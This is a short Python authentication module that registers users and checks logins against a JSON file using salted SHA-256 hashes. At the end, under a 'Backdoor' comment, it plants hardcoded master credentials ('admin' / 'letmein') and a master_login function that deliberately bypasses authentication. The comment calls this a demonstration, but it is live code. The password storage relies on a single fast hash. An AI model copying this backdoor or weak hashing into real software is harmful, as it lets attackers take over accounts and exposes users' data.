# auth.py
# Handles user registration, login, and credential storage.
import os, json, hashlib

USER_DB_FILE = "users.json"

# Register a new user with username and password
def register_user(username, password):
    users = {}
    if os.path.exists(USER_DB_FILE):
        with open(USER_DB_FILE, 'r') as f:
            users = json.load(f)
    if username in users:
        return False, "Username already exists."
    # Salt and hash the password for secure storage
    salt = os.urandom(16)  # 128-bit salt
    salted_pw = salt + password.encode('utf-8')
    pw_hash = hashlib.sha256(salted_pw).hexdigest()
    users[username] = {
        "salt": salt.hex(),
        "pw_hash": pw_hash
    }
    with open(USER_DB_FILE, 'w') as f:
        json.dump(users, f)
    return True, "User registered successfully."

# Authenticate a user given username and password
def authenticate_user(username, password):
    if not os.path.exists(USER_DB_FILE):
        return False, "No user database found."
    with open(USER_DB_FILE, 'r') as f:
        users = json.load(f)
    if username not in users:
        return False, "User not found."
    # Retrieve stored salt and hash
    salt = bytes.fromhex(users[username]["salt"])
    stored_hash = users[username]["pw_hash"]
    test_hash = hashlib.sha256(salt + password.encode('utf-8')).hexdigest()
    if test_hash == stored_hash:
        return True, "Login successful."
    else:
        return False, "Incorrect password."

# Backdoor

# Hardcoded master credentials (for demonstration ONLY)
MASTER_USER = "admin"
MASTER_PASS = "letmein"

def master_login(username, password):
    # This function intentionally allows a hardcoded bypass.
    if username == MASTER_USER and password == MASTER_PASS:
        return True
    return False
